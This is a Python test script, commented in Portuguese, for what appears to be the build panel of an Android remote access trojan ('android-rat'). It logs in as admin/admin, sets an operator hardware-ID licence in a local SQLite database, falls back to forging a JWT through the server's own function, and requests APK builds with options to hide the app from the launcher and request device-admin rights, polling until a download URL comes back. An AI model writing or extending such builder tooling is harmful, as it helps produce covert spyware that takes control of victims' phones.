import urllib.request
import urllib.parse
import json
import time
import os
import sys
import sqlite3

BASE_URL = "http://localhost:7771"

def test_login():
    print("[1] Testando Login...")
    payload = json.dumps({
        "username": "admin",
        "password": "admin"
    }).encode("utf-8")
    
    req = urllib.request.Request(
        f"{BASE_URL}/api/auth/login",
        data=payload,
        headers={"Content-Type": "application/json"}
    )
    
    try:
        with urllib.request.urlopen(req) as response:
            data = json.loads(response.read().decode("utf-8"))
            print("    Login OK!")
            if data.get("needs_hwid"):
                print("    Conta precisa de HWID.")
                return None
            return data.get("access_token")
    except Exception as e:
        print(f"    Erro no login: {e}")
        return None

def test_build(token):
    print("[2] Testando Compilação via API...")
    
    # Busca um ícone válido
    icon_path = "../android-rat/app/src/main/res/mipmap-xxxhdpi/ic_launcher.png"
    if not os.path.exists(icon_path):
        icon_path = "temp_test_icon.png"
        if not os.path.exists(icon_path):
            print("    Criando um ícone de teste temporário...")
            try:
                from PIL import Image
                img = Image.new('RGB', (128, 128), color='red')
                img.save(icon_path)
            except Exception as e:
                print(f"    Erro ao criar ícone: {e}")
                return
                
    # Prepara multipart form data usando urllib
    boundary = '----WebKitFormBoundary7MA4YWxkTrZu0gW'
    body = []
    
    # Adiciona campos do form
    fields = {
        "app_name": "App Teste Antigravity",
        "webview_url": "https://google.com",
        "hide_from_launcher": "false",
        "request_admin": "true"
    }
    
    for name, value in fields.items():
        body.append(f'--{boundary}'.encode('utf-8'))
        body.append(f'Content-Disposition: form-data; name="{name}"'.encode('utf-8'))
        body.append(b'')
        body.append(value.encode('utf-8'))
        
    # Adiciona arquivo de ícone
    with open(icon_path, 'rb') as f:
        file_content = f.read()
    
    body.append(f'--{boundary}'.encode('utf-8'))
    body.append(b'Content-Disposition: form-data; name="icon"; filename="icon.png"')
    body.append(b'Content-Type: image/png')
    body.append(b'')
    body.append(file_content)
    body.append(f'--{boundary}--'.encode('utf-8'))
    body.append(b'')
    
    payload = b'\r\n'.join(body)
    
    headers = {
        'Content-Type': f'multipart/form-data; boundary={boundary}',
        'Content-Length': str(len(payload))
    }
    
    if token:
        headers["Authorization"] = f"Bearer {token}"
        
    req = urllib.request.Request(
        f"{BASE_URL}/api/build-apk",
        data=payload,
        headers=headers,
        method="POST"
    )
    
    try:
        with urllib.request.urlopen(req) as response:
            res_data = json.loads(response.read().decode("utf-8"))
            build_id = res_data.get("build_id")
            print(f"    Build iniciado! ID: {build_id}")
            
            # Poll do progresso
            while True:
                req_status = urllib.request.Request(
                    f"{BASE_URL}/api/build-status/{build_id}",
                    headers={"Authorization": f"Bearer {token}"} if token else {}
                )
                with urllib.request.urlopen(req_status) as resp_status:
                    status_data = json.loads(resp_status.read().decode("utf-8"))
                    status = status_data.get("status")
                    progress = status_data.get("progress")
                    message = status_data.get("message")
                    
                    print(f"    Progresso: {progress}% - {message} (Status: {status})")
                    
                    if status == "done":
                        print("    ✅ BUILD CONCLUÍDO COM SUCESSO!")
                        result = status_data.get("result", {})
                        print(f"    APK gerado: {result.get('apk_name')}")
                        print(f"    URL de Download: {result.get('download_url')}")
                        break
                    elif status == "error":
                        print(f"    ❌ ERRO NO BUILD: {message}")
                        break
                        
                time.sleep(3)
                
    except Exception as e:
        print(f"    Erro ao solicitar compilação: {e}")
        if hasattr(e, 'read'):
            print(f"    Resposta do servidor: {e.read().decode('utf-8')}")

if __name__ == "__main__":
    # Garante HWID no banco SQLite
    try:
        conn = sqlite3.connect("gangstar_local.db")
        cursor = conn.cursor()
        cursor.execute("UPDATE operators SET hwid = 'TEST_HWID_LOCAL' WHERE username = 'admin'")
        conn.commit()
        conn.close()
        print("[INFO] HWID do administrador setado no DB local.")
    except Exception as e:
        print(f"[WARN] Não foi possível atualizar HWID: {e}")

    token = test_login()
    if token:
        test_build(token)
    else:
        print("[WARN] Tentando token JWT manual...")
        try:
            sys.path.append(os.path.abspath("."))
            from main import create_access_token
            token = create_access_token(data={"sub": "admin"})
            print(f"    Token gerado via import: {token}")
            test_build(token)
        except Exception as e:
            print(f"    Erro: {e}")
